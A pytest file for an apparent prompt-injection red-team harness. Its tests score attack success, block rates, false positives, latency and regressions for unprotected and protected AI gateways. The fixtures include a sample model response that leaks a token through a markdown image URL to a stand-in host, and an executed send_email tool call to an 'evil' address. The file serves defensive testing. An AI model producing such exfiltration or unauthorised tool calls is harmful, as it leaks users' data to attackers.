"""Success criteria, run metrics, and regression detection."""

from __future__ import annotations

from typing import Any

import pytest
from pydantic import TypeAdapter

from breakwater.redteam.metrics import percentile, regression, summarize
from breakwater.redteam.models import Criterion
from breakwater.redteam.probes import Probe
from breakwater.redteam.runner import CaseResult
from breakwater.redteam.scorer import score
from breakwater.redteam.targets import Mode, Outcome, ToolCallRecord

CRITERIA = TypeAdapter(list[Criterion])


def criteria(*items: dict[str, Any]) -> list[Criterion]:
    return CRITERIA.validate_python(list(items))


def test_response_criteria() -> None:
    outcome = Outcome(response="Sure: RTC-1 and ![x](https://c.example/?d=RTC-1)")
    assert score(criteria({"type": "response_contains", "value": "RTC-1"}), outcome).success
    assert not score(criteria({"type": "response_contains", "value": "rtc-1"}), outcome).success
    regex = {"type": "response_matches_regex", "value": r"\]\(https://c\.example/[^)]*RTC-1"}
    assert score(criteria(regex), outcome).matched == ("response_matches_regex",)


def test_tool_criteria_count_only_executed_calls() -> None:
    outcome = Outcome(
        tool_calls=[
            ToolCallRecord("send_email", {"to": "Drop@Evil.example"}, "executed"),
            ToolCallRecord("delete_record", {"record_id": 3}, "denied"),
        ]
    )
    assert score(criteria({"type": "tool_called", "name": "send_email"}), outcome).success
    assert not score(criteria({"type": "tool_called", "name": "delete_record"}), outcome).success
    with_args = {"type": "tool_called_with", "name": "send_email", "arguments": {"to": "evil"}}
    assert score(criteria(with_args), outcome).success
    wrong = {"type": "tool_called_with", "name": "send_email", "arguments": {"to": "other"}}
    assert not score(criteria(wrong), outcome).success


def test_judge_is_skipped_and_never_succeeds() -> None:
    result = score(
        criteria(
            {"type": "judge", "question": "?"},
            {"type": "response_contains", "value": "nope"},
        ),
        Outcome(response="anything"),
    )
    assert (result.success, result.skipped) == (False, ("judge",))


def test_percentile_nearest_rank() -> None:
    assert percentile([], 50) is None
    assert percentile([5.0], 95) == 5.0
    values = [float(v) for v in range(1, 101)]
    assert (percentile(values, 50), percentile(values, 95)) == (50.0, 95.0)


def probe(source: str, category: str = "direct_injection", variant: str = "base") -> Probe:
    if category == "benign":
        return Probe("benign", source, variant, category, None, "user_message", "q")
    return Probe("attack", source, variant, category, None, "user_message", "q")


def result(
    p: Probe,
    mode: Mode,
    success: bool = False,
    interventions: tuple[str, ...] = (),
    latency: float = 10.0,
    error: str | None = None,
) -> CaseResult:
    outcome = Outcome(interventions=list(interventions), latency_ms=latency, error=error)
    return CaseResult(p, mode, outcome, success)


def test_summarize() -> None:
    a1, a2 = probe("a1"), probe("a2", variant="case")
    t1 = probe("t1", "tool_abuse")
    b1, b2 = probe("b1", "benign"), probe("b2", "benign")
    results = [
        result(a1, "unprotected", True),
        result(a1, "protected", False, ("blocked",)),
        result(a2, "unprotected", True),
        result(a2, "protected", True),
        result(t1, "unprotected", True),
        result(t1, "protected", error="boom"),
        result(b1, "unprotected", latency=10),
        result(b1, "protected", latency=14),
        result(b2, "unprotected", latency=20),
        result(b2, "protected", interventions=("redacted",), latency=30),
    ]
    results[1].caught_by_layer, results[1].detectors = 1, ["injection_rules"]
    summary = summarize(results)
    direct = summary["asr"]["by_category"]["direct_injection"]
    assert direct["unprotected"]["rate"] == 1.0 and direct["protected"]["rate"] == 0.5
    assert direct["block_rate"] == 0.5
    assert direct["base"]["protected"]["rate"] == 0.0
    assert direct["mutated"]["protected"]["rate"] == 1.0
    tools = summary["asr"]["by_category"]["tool_abuse"]
    assert tools["protected"] == {"rate": None, "successes": 0, "n": 0, "errors": 1}
    assert summary["false_positives"] == {"rate": 0.5, "flagged": ["b2"], "n": 2, "errors": 0}
    assert summary["latency_ms"]["overhead"] == {"p50": 4.0, "p95": 10.0}
    assert summary["caught_by"]["layer"] == {"1": 1}
    assert summary["caught_by"]["detector"] == {"injection_rules": 1}
    assert summary["totals"]["errors"] == 1 and summary["totals"]["attacks"] == 3


def by_category(**rates: float) -> dict[str, Any]:
    return {"asr": {"by_category": {k: {"protected": {"rate": v}} for k, v in rates.items()}}}


@pytest.mark.parametrize(
    ("before", "after", "regressed"),
    [
        (0.30, 0.30, []),
        (0.30, 0.32, []),  # within tolerance
        (0.30, 0.33, ["direct_injection"]),
        (0.30, 0.10, []),  # better is never a regression
    ],
)
def test_regression(before: float, after: float, regressed: list[str]) -> None:
    out = regression(
        by_category(direct_injection=after), by_category(direct_injection=before), 0.02
    )
    assert out["regressed"] == regressed
    assert out["deltas"]["direct_injection"] == round(after - before, 4)


def test_regression_without_previous_run() -> None:
    assert regression(by_category(direct_injection=0.5), None, 0.02)["regressed"] == []


def test_summarize_capped_layers() -> None:
    a1, b1 = probe("a1"), probe("b1", "benign")
    results = [
        result(a1, "unprotected", True),
        result(a1, "protected_l1", True),
        result(a1, "protected", False, ("blocked",)),
        result(b1, "unprotected", latency=10),
        result(b1, "protected_l1", latency=12),
        result(b1, "protected", interventions=("blocked",), latency=40),
    ]
    summary = summarize(results)
    layer1 = summary["layers"]["1"]
    assert layer1["asr"]["overall"]["rate"] == 1.0
    assert layer1["asr"]["by_category"]["direct_injection"]["rate"] == 1.0
    assert layer1["false_positives"] == {"rate": 0.0, "flagged": [], "n": 1}
    assert layer1["latency_ms"]["overhead"]["p50"] == 2.0
    # The full gateway's numbers ignore the capped runs.
    assert summary["asr"]["overall"]["protected"]["rate"] == 0.0
    assert summary["false_positives"]["rate"] == 1.0
    assert summary["latency_ms"]["overhead"]["p50"] == 30.0


def test_summarize_without_capped_layers_has_no_layers_section() -> None:
    a1 = probe("a1")
    assert "layers" not in summarize([result(a1, "unprotected"), result(a1, "protected")])
